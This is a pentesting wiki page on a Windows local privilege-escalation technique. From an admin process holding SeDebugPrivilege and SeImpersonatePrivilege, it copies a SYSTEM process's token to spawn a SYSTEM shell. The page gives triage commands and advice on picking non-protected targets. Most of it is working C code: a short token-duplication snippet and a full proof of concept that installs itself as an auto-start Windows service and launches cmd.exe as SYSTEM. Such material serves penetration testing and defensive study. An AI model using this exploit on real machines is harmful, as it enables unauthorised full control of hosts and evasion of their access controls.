# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

This page covers the **manual token-theft** variant where a **High Integrity** context that already has **`SeDebugPrivilege`** and **`SeImpersonatePrivilege`** opens a suitable **SYSTEM** process, **duplicates its token**, and **spawns a new process** with that token.

If you only need a quick `SYSTEM` shell from a privileged admin process, also check:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

If you do **not** have a process-handle path but you do have **`SeImpersonatePrivilege`**, the **named-pipe / Potato** route is usually easier:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Quick triage

Before trying the token-copy path, confirm that the current process is already in a useful context:

```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```

Notes:

- **`SeDebugPrivilege`** is what lets you open many **non-protected** SYSTEM processes even when their DACL would normally block you.
- **`SeImpersonatePrivilege`** is what makes **`CreateProcessWithTokenW`** practical afterwards.
- If the token-copy path only gives you a weak or filtered SYSTEM token, just steal from a **different SYSTEM process**.

## Pick the target process carefully

The technique is usually shown against **`lsass.exe`**, but on modern Windows that is often the **wrong target**:

- If **LSA Protection / RunAsPPL** is enabled, **`lsass.exe`** is protected and a normal admin process with `SeDebugPrivilege` still won't be able to open it.
- Prefer **non-PPL SYSTEM processes** such as **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`**, or an early **`svchost.exe`** instance.
- **Protected processes** and some special processes such as **`System`** or **`csrss.exe`** are not realistic user-mode targets for this technique.
- Use **Process Hacker / Process Explorer** running elevated to verify whether the target token actually has the privileges you want before duplicating it.

## API details that matter in practice

A lot of public PoCs request **`PROCESS_ALL_ACCESS`** and **`TOKEN_ALL_ACCESS`**, but that is noisier than necessary. In practice:

- Open the target process with only the rights you need (commonly **`PROCESS_QUERY_INFORMATION`** or **`PROCESS_QUERY_LIMITED_INFORMATION`**).
- Open the token with the rights needed for process creation: **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- Use **`DuplicateTokenEx(..., TokenPrimary, ...)`** to create a **primary token**; an impersonation token alone is not enough to create a new process.
- If **`CreateProcessWithTokenW`** fails with **`1314`**, switch to **`CreateProcessAsUserW`**.
- If you launch from a **service / Session 0**, remember that **`CreateProcessWithTokenW`** keeps the child in the **caller's session**. If you need a visible desktop shell, use **`CreateProcessAsUserW`** and move the token to the desired session.

A minimal modern flow looks like:

```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
                 SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
                        L"C:\\Windows\\System32\\cmd.exe",
                        NULL, 0, NULL, NULL, &si, &pi);
```

## Full service PoC

The following code **exploits the privileges `SeDebugPrivilege` and `SeImpersonatePrivilege`** to copy the token from a **process running as SYSTEM** and with **all the token privileges**. In this case, the code can be compiled and used as a **Windows service binary** to verify that the primitive works.

The main part of the **code where the elevation occurs** is inside the **`Exploit`** function. Inside that function you can see that **`lsass.exe`** is searched, its **token is copied**, and finally that token is used to spawn a new **`cmd.exe`** with all the privileges of the copied token.

On modern hosts, you will often want to replace **`lsass.exe`** with another **non-PPL SYSTEM process** such as **`winlogon.exe`**, **`wininit.exe`**, or **`services.exe`**.

Other processes running as SYSTEM with all or most of the token privileges are: **`services.exe`**, **`svchost.exe`** (some of the first ones), **`wininit.exe`**, **`csrss.exe`**... Remember that you generally **won't be able to copy a token from a protected process**.

```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;

	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcSnap, &pe32)) {
			CloseHandle(hProcSnap);
			return 0;
	}

	while (Process32Next(hProcSnap, &pe32)) {
			if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
					pid = pe32.th32ProcessID;
					break;
			}
		}

	CloseHandle(hProcSnap);

	return pid;
}


int Exploit(void) {

    HANDLE hSystemToken, hSystemProcess;
	HANDLE dupSystemToken = NULL;
    HANDLE hProcess, hThread;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
	int pid = 0;


    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

	// open high privileged process
	if ( pid = FindTarget("lsass.exe") )
		hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
	else
		return -1;

	// extract high privileged token
    if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
        CloseHandle(hSystemProcess);
        return -1;
    }

	// make a copy of a token
	DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

	// and spawn a new process with higher privs
    CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
						NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
	switch ( controlCode ) {
		case SERVICE_CONTROL_SHUTDOWN:
		case SERVICE_CONTROL_STOP:
			serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
			SetServiceStatus( serviceStatusHandle, &serviceStatus );

			SetEvent( stopServiceEvent );
			return;

		case SERVICE_CONTROL_PAUSE:
			break;

		case SERVICE_CONTROL_CONTINUE:
			break;

		case SERVICE_CONTROL_INTERROGATE:
			break;

		default:
			break;
	}
	SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
	// initialise service status
	serviceStatus.dwServiceType = SERVICE_WIN32;
	serviceStatus.dwCurrentState = SERVICE_STOPPED;
	serviceStatus.dwControlsAccepted = 0;
	serviceStatus.dwWin32ExitCode = NO_ERROR;
	serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
	serviceStatus.dwCheckPoint = 0;
	serviceStatus.dwWaitHint = 0;

	serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

	if ( serviceStatusHandle ) {
		// service is starting
		serviceStatus.dwCurrentState = SERVICE_START_PENDING;
		SetServiceStatus( serviceStatusHandle, &serviceStatus );

		// do initialisation here
		stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

		// running
		serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
		serviceStatus.dwCurrentState = SERVICE_RUNNING;
		SetServiceStatus( serviceStatusHandle, &serviceStatus );

		Exploit();
		WaitForSingleObject( stopServiceEvent, -1 );

		// service was stopped
		serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
		SetServiceStatus( serviceStatusHandle, &serviceStatus );

		// do cleanup here
		CloseHandle( stopServiceEvent );
		stopServiceEvent = 0;

		// service is now stopped
		serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
		serviceStatus.dwCurrentState = SERVICE_STOPPED;
		SetServiceStatus( serviceStatusHandle, &serviceStatus );
	}
}


void InstallService() {
	SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

	if ( serviceControlManager ) {
		TCHAR path[ _MAX_PATH + 1 ];
		if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
			SC_HANDLE service = CreateService( serviceControlManager,
							serviceName, serviceName,
							SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
							SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
							0, 0, 0, 0, 0 );
			if ( service )
				CloseServiceHandle( service );
		}
		CloseServiceHandle( serviceControlManager );
	}
}

void UninstallService() {
	SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

	if ( serviceControlManager ) {
		SC_HANDLE service = OpenService( serviceControlManager,
			serviceName, SERVICE_QUERY_STATUS | DELETE );
		if ( service ) {
			SERVICE_STATUS serviceStatus;
			if ( QueryServiceStatus( service, &serviceStatus ) ) {
				if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
					DeleteService( service );
			}
			CloseServiceHandle( service );
		}
		CloseServiceHandle( serviceControlManager );
	}
}

int _tmain( int argc, TCHAR* argv[] )
{
	if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
		InstallService();
	}
	else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
		UninstallService();
	}
	else  {
		SERVICE_TABLE_ENTRY serviceTable[] = {
			{ serviceName, ServiceMain },
			{ 0, 0 }
		};

		StartServiceCtrlDispatcher( serviceTable );
	}

	return 0;
}
```

## References

- [CreateProcessWithTokenW function (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [Configure added LSA protection (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
